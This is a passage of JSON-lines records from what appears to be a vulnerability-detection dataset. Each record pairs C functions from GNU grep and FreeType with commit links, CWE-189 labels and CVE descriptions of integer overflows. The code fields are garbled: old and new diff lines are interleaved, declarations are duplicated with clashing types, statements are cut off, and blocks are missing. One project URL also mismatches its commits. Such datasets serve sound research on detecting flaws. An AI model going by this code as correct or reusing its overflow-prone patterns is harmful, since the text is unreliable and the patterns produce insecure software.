inputs in (1) smooth/ftsmooth.c, (2) sfnt/ttcmap.c, and (3) cff/cffload.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0946"}
{"idx": 158027, "project": "savannah", "commit_id": "8fcf61523644df42e1905c81bed26838e0b04f91", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/grep.git/commit/?id=8fcf61523644df42e1905c81bed26838e0b04f91", "commit_message": "None", "target": 0, "func": "context_length_arg (char const *str, int *out)\ncontext_length_arg (char const *str, intmax_t *out)\n {\n  switch (xstrtoimax (str, 0, 10, out, \"\"))\n     {\n    case LONGINT_OK:\n    case LONGINT_OVERFLOW:\n      if (0 <= *out)\n        break;\n      /* Fall through.  */\n    default:\n       error (EXIT_TROUBLE, 0, \"%s: %s\", str,\n              _(\"invalid context length argument\"));\n     }\n   page size, unless a read yields a partial page.  */\n\nstatic char *buffer;\t\t/* Base of buffer. */\nstatic size_t bufalloc;\t\t/* Allocated buffer size, counting slop. */\n#define INITIAL_BUFSIZE 32768\t/* Initial buffer size, not counting slop. */\nstatic int bufdesc;\t\t/* File descriptor. */\nstatic char *bufbeg;\t\t/* Beginning of user-visible stuff. */\nstatic char *buflim;\t\t/* Limit of user-visible stuff. */\nstatic size_t pagesize;\t\t/* alignment of memory pages */\nstatic off_t bufoffset;\t\t/* Read offset; defined on regular files.  */\nstatic off_t after_last_match;\t/* Pointer after last matching line that\n                                   would have been output if we were\n                                   outputting characters. */\n\n/* Return VAL aligned to the next multiple of ALIGNMENT.  VAL can be\n   an integer or a pointer.  Both args must be free of side effects.  */\n#define ALIGN_TO(val, alignment) \\\n  ((size_t) (val) % (alignment) == 0 \\\n   ? (val) \\\n   : (val) + ((alignment) - (size_t) (val) % (alignment)))\n\n/* Reset the buffer for a new file, returning zero if we should skip it.\n   Initialize on the first time through. */\nstatic int\nreset (int fd, char const *file, struct stats *stats)\n{\n  if (! pagesize)\n    {\n      pagesize = getpagesize ();\n      if (pagesize == 0 || 2 * pagesize + 1 <= pagesize)\n        abort ();\n      bufalloc = ALIGN_TO (INITIAL_BUFSIZE, pagesize) + pagesize + 1;\n      buffer = xmalloc (bufalloc);\n    }\n\n  bufbeg = buflim = ALIGN_TO (buffer + 1, pagesize);\n  bufbeg[-1] = eolbyte;\n  bufdesc = fd;\n\n  if (S_ISREG (stats->stat.st_mode))\n    {\n      if (file)\n        bufoffset = 0;\n      else\n        {\n          bufoffset = lseek (fd, 0, SEEK_CUR);\n          if (bufoffset < 0)\n            {\n              suppressible_error (_(\"lseek failed\"), errno);\n              return 0;\n            }\n        }\n    }\n  return 1;\n}\n\n/* Read new stuff into the buffer, saving the specified\n   amount of old stuff.  When we're done, 'bufbeg' points\n   to the beginning of the buffer contents, and 'buflim'\n   points just after the end.  Return zero if there's an error.  */\nstatic int\nfillbuf (size_t save, struct stats const *stats)\n{\n  size_t fillsize = 0;\n  int cc = 1;\n  char *readbuf;\n  size_t readsize;\n\n  /* Offset from start of buffer to start of old stuff\n     that we want to save.  */\n  size_t saved_offset = buflim - save - buffer;\n\n  if (pagesize <= buffer + bufalloc - buflim)\n    {\n      readbuf = buflim;\n      bufbeg = buflim - save;\n    }\n  else\n    {\n      size_t minsize = save + pagesize;\n      size_t newsize;\n      size_t newalloc;\n      char *newbuf;\n\n      /* Grow newsize until it is at least as great as minsize.  */\n      for (newsize = bufalloc - pagesize - 1; newsize < minsize; newsize *= 2)\n        if (newsize * 2 < newsize || newsize * 2 + pagesize + 1 < newsize * 2)\n          xalloc_die ();\n\n      /* Try not to allocate more memory than the file size indicates,\n         as that might cause unnecessary memory exhaustion if the file\n         is large.  However, do not use the original file size as a\n         heuristic if we've already read past the file end, as most\n         likely the file is growing.  */\n      if (S_ISREG (stats->stat.st_mode))\n        {\n          off_t to_be_read = stats->stat.st_size - bufoffset;\n          off_t maxsize_off = save + to_be_read;\n          if (0 <= to_be_read && to_be_read <= maxsize_off\n              && maxsize_off == (size_t) maxsize_off\n              && minsize <= (size_t) maxsize_off\n              && (size_t) maxsize_off < newsize)\n            newsize = maxsize_off;\n        }\n\n      /* Add enough room so that the buffer is aligned and has room\n         for byte sentinels fore and aft.  */\n      newalloc = newsize + pagesize + 1;\n\n      newbuf = bufalloc < newalloc ? xmalloc (bufalloc = newalloc) : buffer;\n      readbuf = ALIGN_TO (newbuf + 1 + save, pagesize);\n      bufbeg = readbuf - save;\n      memmove (bufbeg, buffer + saved_offset, save);\n      bufbeg[-1] = eolbyte;\n      if (newbuf != buffer)\n        {\n          free (buffer);\n          buffer = newbuf;\n        }\n    }\n\n  readsize = buffer + bufalloc - readbuf;\n  readsize -= readsize % pagesize;\n\n  if (! fillsize)\n    {\n      ssize_t bytesread;\n      while ((bytesread = read (bufdesc, readbuf, readsize)) < 0\n             && errno == EINTR)\n        continue;\n      if (bytesread < 0)\n        cc = 0;\n      else\n        fillsize = bytesread;\n    }\n\n  bufoffset += fillsize;\n#if defined HAVE_DOS_FILE_CONTENTS\n  if (fillsize)\n    fillsize = undossify_input (readbuf, fillsize);\n#endif\n  buflim = readbuf + fillsize;\n  return cc;\n}\n\n/* Flags controlling the style of output. */\nstatic enum\n{\n  BINARY_BINARY_FILES,\n  TEXT_BINARY_FILES,\n  WITHOUT_MATCH_BINARY_FILES\n} binary_files;\t\t/* How to handle binary files.  */\n\nstatic int filename_mask;\t/* If zero, output nulls after filenames.  */\nstatic int out_quiet;\t\t/* Suppress all normal output. */\nstatic int out_invert;\t\t/* Print nonmatching stuff. */\nstatic int out_file;\t\t/* Print filenames. */\nstatic int out_line;\t\t/* Print line numbers. */\nstatic int out_byte;\t\t/* Print byte offsets. */\nstatic int out_before;\t\t/* Lines of leading context. */\nstatic int out_after;\t\t/* Lines of trailing context. */\n static int out_file;\t\t/* Print filenames. */\n static int out_line;\t\t/* Print line numbers. */\n static int out_byte;\t\t/* Print byte offsets. */\nstatic intmax_t out_before;\t/* Lines of leading context. */\nstatic intmax_t out_after;\t/* Lines of trailing context. */\n static int count_matches;\t/* Count matching lines.  */\n static int list_files;\t\t/* List matching files.  */\n static int no_filenames;\t/* Suppress file names.  */\nstatic intmax_t max_count;\t/* Stop after outputting this many\n                                    lines from an input file.  */\n static int line_buffered;       /* If nonzero, use line buffering, i.e.\n                                    fflush everyline out.  */\nstatic char const *lastnl;\t/* Pointer after last newline counted. */\nstatic char const *lastout;\t/* Pointer after last character output;\n                                   NULL if no character has been output\n                                   or if it's conceptually before bufbeg. */\nstatic uintmax_t totalnl;\t/* Total newline count before lastnl. */\nstatic off_t outleft;\t\t/* Maximum number of lines to be output.  */\nstatic int pending;\t\t/* Pending lines of output.\n                                    NULL if no character has been output\n                                    or if it's conceptually before bufbeg. */\n static uintmax_t totalnl;\t/* Total newline count before lastnl. */\nstatic intmax_t outleft;\t/* Maximum number of lines to be output.  */\nstatic intmax_t pending;\t/* Pending lines of output.\n                                    Always kept 0 if out_quiet is true.  */\n static int done_on_match;\t/* Stop scanning file on first match.  */\n static int exit_on_match;\t/* Exit on first match.  */\n/* Add two numbers that count input bytes or lines, and report an\n   error if the addition overflows.  */\nstatic uintmax_t\nadd_count (uintmax_t a, uintmax_t b)\n{\n  uintmax_t sum = a + b;\n  if (sum < a)\n    error (EXIT_TROUBLE, 0, _(\"input is too large to count\"));\n  return sum;\n}\n\nstatic void\nnlscan (char const *lim)\n{\n  size_t newlines = 0;\n  char const *beg;\n  for (beg = lastnl; beg < lim; beg++)\n    {\n      beg = memchr (beg, eolbyte, lim - beg);\n      if (!beg)\n        break;\n      newlines++;\n    }\n  totalnl = add_count (totalnl, newlines);\n  lastnl = lim;\n}\n\n/* Print the current filename.  */\nstatic void\nprint_filename (void)\n{\n  pr_sgr_start_if (filename_color);\n  fputs (filename, stdout);\n  pr_sgr_end_if (filename_color);\n}\n\n/* Print a character separator.  */\nstatic void\nprint_sep (char sep)\n{\n  pr_sgr_start_if (sep_color);\n  fputc (sep, stdout);\n  pr_sgr_end_if (sep_color);\n}\n\n/* Print a line number or a byte offset.  */\nstatic void\nprint_offset (uintmax_t pos, int min_width, const char *color)\n{\n  /* Do not rely on printf to print pos, since uintmax_t may be longer\n     than long, and long long is not portable.  */\n\n  char buf[sizeof pos * CHAR_BIT];\n  char *p = buf + sizeof buf;\n\n  do\n    {\n      *--p = '0' + pos % 10;\n      --min_width;\n    }\n  while ((pos /= 10) != 0);\n\n  /* Do this to maximize the probability of alignment across lines.  */\n  if (align_tabs)\n    while (--min_width >= 0)\n      *--p = ' ';\n\n  pr_sgr_start_if (color);\n  fwrite (p, 1, buf + sizeof buf - p, stdout);\n  pr_sgr_end_if (color);\n}\n\n/* Print a whole line head (filename, line, byte).  */\nstatic void\nprint_line_head (char const *beg, char const *lim, int sep)\n{\n  int pending_sep = 0;\n\n  if (out_file)\n    {\n      print_filename ();\n      if (filename_mask)\n        pending_sep = 1;\n      else\n        fputc (0, stdout);\n    }\n\n  if (out_line)\n    {\n      if (lastnl < lim)\n        {\n          nlscan (beg);\n          totalnl = add_count (totalnl, 1);\n          lastnl = lim;\n        }\n      if (pending_sep)\n        print_sep (sep);\n      print_offset (totalnl, 4, line_num_color);\n      pending_sep = 1;\n    }\n\n  if (out_byte)\n    {\n      uintmax_t pos = add_count (totalcc, beg - bufbeg);\n#if defined HAVE_DOS_FILE_CONTENTS\n      pos = dossified_pos (pos);\n#endif\n      if (pending_sep)\n        print_sep (sep);\n      print_offset (pos, 6, byte_num_color);\n      pending_sep = 1;\n    }\n\n  if (pending_sep)\n    {\n      /* This assumes sep is one column wide.\n         Try doing this any other way with Unicode\n         (and its combining and wide characters)\n         filenames and you're wasting your efforts.  */\n      if (align_tabs)\n        fputs (\"\\t\\b\", stdout);\n\n      print_sep (sep);\n    }\n}\n\nstatic const char *\nprint_line_middle (const char *beg, const char *lim,\n                   const char *line_color, const char *match_color)\n{\n  size_t match_size;\n  size_t match_offset;\n  const char *cur = beg;\n  const char *mid = NULL;\n\n  while (cur < lim\n         && ((match_offset = execute (beg, lim - beg, &match_size,\n                                      beg + (cur - beg))) != (size_t) -1))\n    {\n      char const *b = beg + match_offset;\n\n      /* Avoid matching the empty line at the end of the buffer. */\n      if (b == lim)\n        break;\n\n      /* Avoid hanging on grep --color \"\" foo */\n      if (match_size == 0)\n        {\n          /* Make minimal progress; there may be further non-empty matches.  */\n          /* XXX - Could really advance by one whole multi-octet character.  */\n          match_size = 1;\n          if (!mid)\n            mid = cur;\n        }\n      else\n        {\n          /* This function is called on a matching line only,\n             but is it selected or rejected/context?  */\n          if (only_matching)\n            print_line_head (b, lim, (out_invert ? SEP_CHAR_REJECTED\n                                      : SEP_CHAR_SELECTED));\n          else\n            {\n              pr_sgr_start (line_color);\n              if (mid)\n                {\n                  cur = mid;\n                  mid = NULL;\n                }\n              fwrite (cur, sizeof (char), b - cur, stdout);\n            }\n\n          pr_sgr_start_if (match_color);\n          fwrite (b, sizeof (char), match_size, stdout);\n          pr_sgr_end_if (match_color);\n          if (only_matching)\n            fputs (\"\\n\", stdout);\n        }\n      cur = b + match_size;\n    }\n\n  if (only_matching)\n    cur = lim;\n  else if (mid)\n    cur = mid;\n\n  return cur;\n}\n\nstatic const char *\nprint_line_tail (const char *beg, const char *lim, const char *line_color)\n{\n  size_t eol_size;\n  size_t tail_size;\n\n  eol_size   = (lim > beg && lim[-1] == eolbyte);\n  eol_size  += (lim - eol_size > beg && lim[-(1 + eol_size)] == '\\r');\n  tail_size  =  lim - eol_size - beg;\n\n  if (tail_size > 0)\n    {\n      pr_sgr_start (line_color);\n      fwrite (beg, 1, tail_size, stdout);\n      beg += tail_size;\n      pr_sgr_end (line_color);\n    }\n\n  return beg;\n}\n\nstatic void\nprline (char const *beg, char const *lim, int sep)\n{\n  int matching;\n  const char *line_color;\n  const char *match_color;\n\n  if (!only_matching)\n    print_line_head (beg, lim, sep);\n\n  matching = (sep == SEP_CHAR_SELECTED) ^ !!out_invert;\n\n  if (color_option)\n    {\n      line_color = (((sep == SEP_CHAR_SELECTED)\n                     ^ (out_invert && (color_option < 0)))\n                    ? selected_line_color  : context_line_color);\n      match_color = (sep == SEP_CHAR_SELECTED\n                     ? selected_match_color : context_match_color);\n    }\n  else\n    line_color = match_color = NULL; /* Shouldn't be used.  */\n\n  if ((only_matching && matching)\n      || (color_option  && (*line_color || *match_color)))\n    {\n      /* We already know that non-matching lines have no match (to colorize).  */\n      if (matching && (only_matching || *match_color))\n        beg = print_line_middle (beg, lim, line_color, match_color);\n\n      /* FIXME: this test may be removable.  */\n      if (!only_matching && *line_color)\n        beg = print_line_tail (beg, lim, line_color);\n    }\n\n  if (!only_matching && lim > beg)\n    fwrite (beg, 1, lim - beg, stdout);\n\n  if (ferror (stdout))\n    {\n      write_error_seen = 1;\n      error (EXIT_TROUBLE, 0, _(\"write error\"));\n    }\n\n  lastout = lim;\n\n  if (line_buffered)\n    fflush (stdout);\n}\n\n/* Print pending lines of trailing context prior to LIM. Trailing context ends\n   at the next matching line when OUTLEFT is 0.  */\nstatic void\nprpending (char const *lim)\n{\n  if (!lastout)\n    lastout = bufbeg;\n  while (pending > 0 && lastout < lim)\n    {\n      char const *nl = memchr (lastout, eolbyte, lim - lastout);\n      size_t match_size;\n      --pending;\n      if (outleft\n          || ((execute (lastout, nl + 1 - lastout,\n                        &match_size, NULL) == (size_t) -1)\n              == !out_invert))\n        prline (lastout, nl + 1, SEP_CHAR_REJECTED);\n      else\n        pending = 0;\n    }\n}\n\n/* Print the lines between BEG and LIM.  Deal with context crap.\n   If NLINESP is non-null, store a count of lines between BEG and LIM.  */\nstatic void\nprtext (char const *beg, char const *lim, int *nlinesp)\n{\n /* Print the lines between BEG and LIM.  Deal with context crap.\n    If NLINESP is non-null, store a count of lines between BEG and LIM.  */\n static void\nprtext (char const *beg, char const *lim, intmax_t *nlinesp)\n {\n   static int used;\t/* avoid printing SEP_STR_GROUP before any output */\n   char const *bp, *p;\n   char eol = eolbyte;\n  intmax_t i, n;\n \n   if (!out_quiet && pending > 0)\n     prpending (beg);\n      /* Deal with leading context crap. */\n\n      bp = lastout ? lastout : bufbeg;\n      for (i = 0; i < out_before; ++i)\n        if (p > bp)\n          do\n            --p;\n          while (p[-1] != eol);\n\n      /* We print the SEP_STR_GROUP separator only if our output is\n         discontiguous from the last output in the file. */\n      if ((out_before || out_after) && used && p != lastout && group_separator)\n        {\n          pr_sgr_start_if (sep_color);\n          fputs (group_separator, stdout);\n          pr_sgr_end_if (sep_color);\n          fputc ('\\n', stdout);\n        }\n\n      while (p < beg)\n        {\n          char const *nl = memchr (p, eol, beg - p);\n          nl++;\n          prline (p, nl, SEP_CHAR_REJECTED);\n          p = nl;\n        }\n    }\n\n  if (nlinesp)\n    {\n      /* Caller wants a line count. */\n      for (n = 0; p < lim && n < outleft; n++)\n        {\n          char const *nl = memchr (p, eol, lim - p);\n          nl++;\n          if (!out_quiet)\n            prline (p, nl, SEP_CHAR_SELECTED);\n          p = nl;\n        }\n      *nlinesp = n;\n\n      /* relying on it that this function is never called when outleft = 0.  */\n      after_last_match = bufoffset - (buflim - p);\n    }\n  else if (!out_quiet)\n    prline (beg, lim, SEP_CHAR_SELECTED);\n\n  pending = out_quiet ? 0 : out_after;\n  used = 1;\n}\n\nstatic size_t\ndo_execute (char const *buf, size_t size, size_t *match_size, char const *start_ptr)\n{\n  size_t result;\n  const char *line_next;\n\n  /* With the current implementation, using --ignore-case with a multi-byte\n     character set is very inefficient when applied to a large buffer\n     containing many matches.  We can avoid much of the wasted effort\n     by matching line-by-line.\n\n     FIXME: this is just an ugly workaround, and it doesn't really\n     belong here.  Also, PCRE is always using this same per-line\n     matching algorithm.  Either we fix -i, or we should refactor\n     this code---for example, we could add another function pointer\n     to struct matcher to split the buffer passed to execute.  It would\n     perform the memchr if line-by-line matching is necessary, or just\n     return buf + size otherwise.  */\n  if (MB_CUR_MAX == 1 || !match_icase)\n    return execute (buf, size, match_size, start_ptr);\n\n  for (line_next = buf; line_next < buf + size; )\n    {\n      const char *line_buf = line_next;\n      const char *line_end = memchr (line_buf, eolbyte, (buf + size) - line_buf);\n      if (line_end == NULL)\n        line_next = line_end = buf + size;\n      else\n        line_next = line_end + 1;\n\n      if (start_ptr && start_ptr >= line_end)\n        continue;\n\n      result = execute (line_buf, line_next - line_buf, match_size, start_ptr);\n      if (result != (size_t) -1)\n        return (line_buf - buf) + result;\n    }\n\n  return (size_t) -1;\n}\n\n/* Scan the specified portion of the buffer, matching lines (or\n   between matching lines if OUT_INVERT is true).  Return a count of\n   lines printed. */\nstatic int\ngrepbuf (char const *beg, char const *lim)\n /* Scan the specified portion of the buffer, matching lines (or\n    between matching lines if OUT_INVERT is true).  Return a count of\n    lines printed. */\nstatic intmax_t\n grepbuf (char const *beg, char const *lim)\n {\n  intmax_t nlines, n;\n   char const *p;\n   size_t match_offset;\n   size_t match_size;\n    {\n      char const *b = p + match_offset;\n      char const *endp = b + match_size;\n      /* Avoid matching the empty line at the end of the buffer. */\n      if (b == lim)\n        break;\n      if (!out_invert)\n        {\n          prtext (b, endp, (int *) 0);\n          nlines++;\n         break;\n       if (!out_invert)\n         {\n          prtext (b, endp, NULL);\n           nlines++;\n           outleft--;\n           if (!outleft || done_on_match)\n            }\n        }\n      else if (p < b)\n        {\n          prtext (p, b, &n);\n          nlines += n;\n          outleft -= n;\n          if (!outleft)\n            return nlines;\n        }\n      p = endp;\n    }\n  if (out_invert && p < lim)\n    {\n      prtext (p, lim, &n);\n      nlines += n;\n      outleft -= n;\n    }\n  return nlines;\n}\n\n/* Search a given file.  Normally, return a count of lines printed;\n   but if the file is a directory and we search it recursively, then\n   return -2 if there was a match, and -1 otherwise.  */\nstatic int\ngrep (int fd, char const *file, struct stats *stats)\n /* Search a given file.  Normally, return a count of lines printed;\n    but if the file is a directory and we search it recursively, then\n    return -2 if there was a match, and -1 otherwise.  */\nstatic intmax_t\n grep (int fd, char const *file, struct stats *stats)\n {\n  intmax_t nlines, i;\n   int not_text;\n   size_t residue, save;\n   char oldc;\n    return 0;\n\n  if (file && directories == RECURSE_DIRECTORIES\n      && S_ISDIR (stats->stat.st_mode))\n    {\n      /* Close fd now, so that we don't open a lot of file descriptors\n         when we recurse deeply.  */\n      if (close (fd) != 0)\n        suppressible_error (file, errno);\n      return grepdir (file, stats) - 2;\n    }\n\n  totalcc = 0;\n  lastout = 0;\n  totalnl = 0;\n  outleft = max_count;\n  after_last_match = 0;\n  pending = 0;\n\n  nlines = 0;\n  residue = 0;\n  save = 0;\n\n  if (! fillbuf (save, stats))\n    {\n      suppressible_error (filename, errno);\n      return 0;\n    }\n\n  not_text = (((binary_files == BINARY_BINARY_FILES && !out_quiet)\n               || binary_files == WITHOUT_MATCH_BINARY_FILES)\n              && memchr (bufbeg, eol ? '\\0' : '\\200', buflim - bufbeg));\n  if (not_text && binary_files == WITHOUT_MATCH_BINARY_FILES)\n    return 0;\n  done_on_match += not_text;\n  out_quiet += not_text;\n\n  for (;;)\n    {\n      lastnl = bufbeg;\n      if (lastout)\n        lastout = bufbeg;\n\n      beg = bufbeg + save;\n\n      /* no more data to scan (eof) except for maybe a residue -> break */\n      if (beg == buflim)\n        break;\n\n      /* Determine new residue (the length of an incomplete line at the end of\n         the buffer, 0 means there is no incomplete last line).  */\n      oldc = beg[-1];\n      beg[-1] = eol;\n      for (lim = buflim; lim[-1] != eol; lim--)\n        continue;\n      beg[-1] = oldc;\n      if (lim == beg)\n        lim = beg - residue;\n      beg -= residue;\n      residue = buflim - lim;\n\n      if (beg < lim)\n        {\n          if (outleft)\n            nlines += grepbuf (beg, lim);\n          if (pending)\n            prpending (lim);\n          if ((!outleft && !pending) || (nlines && done_on_match && !out_invert))\n            goto finish_grep;\n        }\n\n      /* The last OUT_BEFORE lines at the end of the buffer will be needed as\n         leading context if there is a matching line at the begin of the\n         next data. Make beg point to their begin.  */\n      i = 0;\n      beg = lim;\n      while (i < out_before && beg > bufbeg && beg != lastout)\n        {\n          ++i;\n          do\n            --beg;\n          while (beg[-1] != eol);\n        }\n\n      /* detect if leading context is discontinuous from last printed line.  */\n      if (beg != lastout)\n        lastout = 0;\n\n      /* Handle some details and read more data to scan.  */\n      save = residue + lim - beg;\n      if (out_byte)\n        totalcc = add_count (totalcc, buflim - bufbeg - save);\n      if (out_line)\n        nlscan (beg);\n      if (! fillbuf (save, stats))\n        {\n          suppressible_error (filename, errno);\n          goto finish_grep;\n        }\n    }\n  if (residue)\n    {\n      *buflim++ = eol;\n      if (outleft)\n        nlines += grepbuf (bufbeg + save - residue, buflim);\n      if (pending)\n        prpending (buflim);\n    }\n\n finish_grep:\n  done_on_match -= not_text;\n  out_quiet -= not_text;\n  if ((not_text & ~out_quiet) && nlines != 0)\n    printf (_(\"Binary file %s matches\\n\"), filename);\n  return nlines;\n}\n\nstatic int\ngrepfile (char const *file, struct stats *stats)\n{\n  int desc;\n  int count;\n  int status;\n grepfile (char const *file, struct stats *stats)\n {\n   int desc;\n  intmax_t count;\n   int status;\n \n   filename = (file ? file : label ? label : _(\"(standard input)\"));\n      /* Don't open yet, since that might have side effects on a device.  */\n      desc = -1;\n    }\n  else\n    {\n      /* When skipping directories, don't worry about directories\n         that can't be opened.  */\n      desc = open (file, O_RDONLY);\n      if (desc < 0 && directories != SKIP_DIRECTORIES)\n        {\n          suppressible_error (file, errno);\n          return 1;\n        }\n    }\n\n  if (desc < 0\n      ? stat (file, &stats->stat) != 0\n      : fstat (desc, &stats->stat) != 0)\n    {\n      suppressible_error (filename, errno);\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  if ((directories == SKIP_DIRECTORIES && S_ISDIR (stats->stat.st_mode))\n      || (devices == SKIP_DEVICES && (S_ISCHR (stats->stat.st_mode)\n                                      || S_ISBLK (stats->stat.st_mode)\n                                      || S_ISSOCK (stats->stat.st_mode)\n                                      || S_ISFIFO (stats->stat.st_mode))))\n    {\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  /* If there is a regular file on stdout and the current file refers\n     to the same i-node, we have to report the problem and skip it.\n     Otherwise when matching lines from some other input reach the\n     disk before we open this file, we can end up reading and matching\n     those lines and appending them to the file from which we're reading.\n     Then we'd have what appears to be an infinite loop that'd terminate\n     only upon filling the output file system or reaching a quota.\n     However, there is no risk of an infinite loop if grep is generating\n     no output, i.e., with --silent, --quiet, -q.\n     Similarly, with any of these:\n       --max-count=N (-m) (for N >= 2)\n       --files-with-matches (-l)\n       --files-without-match (-L)\n     there is no risk of trouble.\n     For --max-count=1, grep stops after printing the first match,\n     so there is no risk of malfunction.  But even --max-count=2, with\n     input==output, while there is no risk of infloop, there is a race\n     condition that could result in \"alternate\" output.  */\n  if (!out_quiet && list_files == 0 && 1 < max_count\n      && S_ISREG (out_stat.st_mode) && out_stat.st_ino\n      && SAME_INODE (stats->stat, out_stat))\n    {\n      if (! suppress_errors)\n        error (0, 0, _(\"input file %s is also the output\"), quote (filename));\n      errseen = 1;\n      if (file)\n        close (desc);\n      return 1;\n    }\n\n  if (desc < 0)\n    {\n      desc = open (file, O_RDONLY);\n      if (desc < 0)\n        {\n          suppressible_error (file, errno);\n          return 1;\n        }\n    }\n\n#if defined SET_BINARY\n  /* Set input to binary mode.  Pipes are simulated with files\n     on DOS, so this includes the case of \"foo | grep bar\".  */\n  if (!isatty (desc))\n    SET_BINARY (desc);\n#endif\n\n  count = grep (desc, file, stats);\n  if (count < 0)\n    status = count + 2;\n  else\n    {\n      if (count_matches)\n        {\n          if (out_file)\n            {\n              print_filename ();\n              if (filename_mask)\n                print_sep (SEP_CHAR_SELECTED);\n              else\n                fputc (0, stdout);\n            }\n          printf (\"%d\\n\", count);\n        }\n               else\n                 fputc (0, stdout);\n             }\n          printf (\"%\" PRIdMAX \"\\n\", count);\n         }\n \n       status = !count;\n\n      if (! file)\n        {\n          off_t required_offset = outleft ? bufoffset : after_last_match;\n          if (required_offset != bufoffset\n              && lseek (desc, required_offset, SEEK_SET) < 0\n              && S_ISREG (stats->stat.st_mode))\n            suppressible_error (filename, errno);\n        }\n      else\n        while (close (desc) != 0)\n          if (errno != EINTR)\n            {\n              suppressible_error (file, errno);\n              break;\n            }\n    }\n", "func_hash": 46085918764084639984457622752978355870, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-5667", "cve_desc": "Multiple integer overflows in GNU Grep before 2.11 might allow context-dependent attackers to execute arbitrary code via vectors involving a long input line that triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5667"}
{"idx": 158041, "project": "savannah", "commit_id": "ef1eba75187adfac750f326b563fe543dd5ff4e6", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ef1eba75187adfac750f326b563fe543dd5ff4e6", "commit_message": "None", "target": 0, "func": "  pcf_get_encodings( FT_Stream  stream,\n                     PCF_Face   face )\n  {\n    FT_Error      error;\n    FT_Memory     memory = FT_FACE( face )->memory;\n    FT_ULong      format, size;\n    int           firstCol, lastCol;\n    int           firstRow, lastRow;\n    int           nencoding, encodingOffset;\n    int           i, j, k;\n    PCF_Encoding  encoding = NULL;\n\n\n    error = pcf_seek_to_table_type( stream,\n                                    face->toc.tables,\n                                    face->toc.count,\n                                    PCF_BDF_ENCODINGS,\n                                    &format,\n                                    &size );\n    if ( error )\n      return error;\n\n    error = FT_Stream_EnterFrame( stream, 14 );\n    if ( error )\n      return error;\n\n    format = FT_GET_ULONG_LE();\n\n    if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n    {\n      firstCol          = FT_GET_SHORT();\n      lastCol           = FT_GET_SHORT();\n      firstRow          = FT_GET_SHORT();\n      lastRow           = FT_GET_SHORT();\n      face->defaultChar = FT_GET_SHORT();\n    }\n    else\n    {\n      firstCol          = FT_GET_SHORT_LE();\n      lastCol           = FT_GET_SHORT_LE();\n      firstRow          = FT_GET_SHORT_LE();\n      lastRow           = FT_GET_SHORT_LE();\n      face->defaultChar = FT_GET_SHORT_LE();\n    }\n\n    FT_Stream_ExitFrame( stream );\n\n     if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n       return FT_THROW( Invalid_File_Format );\n \n    /* sanity checks */\n    if ( firstCol < 0       ||\n         firstCol > lastCol ||\n         lastCol  > 0xFF    ||\n         firstRow < 0       ||\n         firstRow > lastRow ||\n         lastRow  > 0xFF    )\n      return FT_THROW( Invalid_Table );\n\n     FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n \n     FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",\n      goto Bail;\n\n    k = 0;\n    for ( i = firstRow; i <= lastRow; i++ )\n    {\n      for ( j = firstCol; j <= lastCol; j++ )\n      {\n        if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n          encodingOffset = FT_GET_SHORT();\n        else\n          encodingOffset = FT_GET_SHORT_LE();\n\n        if ( encodingOffset != -1 )\n        {\n          encoding[k].enc   = i * 256 + j;\n          encoding[k].glyph = (FT_Short)encodingOffset;\n\n          FT_TRACE5(( \"  code %d (0x%04X): idx %d\\n\",\n                      encoding[k].enc, encoding[k].enc, encoding[k].glyph ));\n\n          k++;\n        }\n      }\n    }\n    FT_Stream_ExitFrame( stream );\n\n    if ( FT_RENEW_ARRAY( encoding, nencoding, k ) )\n      goto Bail;\n\n    face->nencodings = k;\n    face->encodings  = encoding;\n\n    return error;\n\n  Bail:\n    FT_FREE( encoding );\n    return error;\n  }\n", "func_hash": 65067616049209972384721953510505056376, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9670", "cve_desc": "Multiple integer signedness errors in the pcf_get_encodings function in pcf/pcfread.c in FreeType before 2.5.4 allow remote attackers to cause a denial of service (integer overflow, NULL pointer dereference, and application crash) via a crafted PCF file that specifies negative values for the first column and first row.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9670"}
{"idx": 158043, "project": "savannah", "commit_id": "257c270bd25e15890190a28a1456e7623bba4439", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=257c270bd25e15890190a28a1456e7623bba4439", "commit_message": "None", "target": 0, "func": "  tt_sbit_decoder_init( TT_SBitDecoder       decoder,\n                        TT_Face              face,\n                        FT_ULong             strike_index,\n                        TT_SBit_MetricsRec*  metrics )\n  {\n    FT_Error   error;\n    FT_Stream  stream = face->root.stream;\n    FT_ULong   ebdt_size;\n\n\n    error = face->goto_table( face, TTAG_CBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_EBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_bdat, stream, &ebdt_size );\n    if ( error )\n      goto Exit;\n\n    decoder->face    = face;\n    decoder->stream  = stream;\n    decoder->bitmap  = &face->root.glyph->bitmap;\n    decoder->metrics = metrics;\n\n    decoder->metrics_loaded   = 0;\n    decoder->bitmap_allocated = 0;\n\n    decoder->ebdt_start = FT_STREAM_POS();\n    decoder->ebdt_size  = ebdt_size;\n\n    decoder->eblc_base  = face->sbit_table;\n    decoder->eblc_limit = face->sbit_table + face->sbit_table_size;\n\n    /* now find the strike corresponding to the index */\n    {\n      FT_Byte*  p;\n\n\n      if ( 8 + 48 * strike_index + 3 * 4 + 34 + 1 > face->sbit_table_size )\n      {\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      p = decoder->eblc_base + 8 + 48 * strike_index;\n\n      decoder->strike_index_array = FT_NEXT_ULONG( p );\n      p                          += 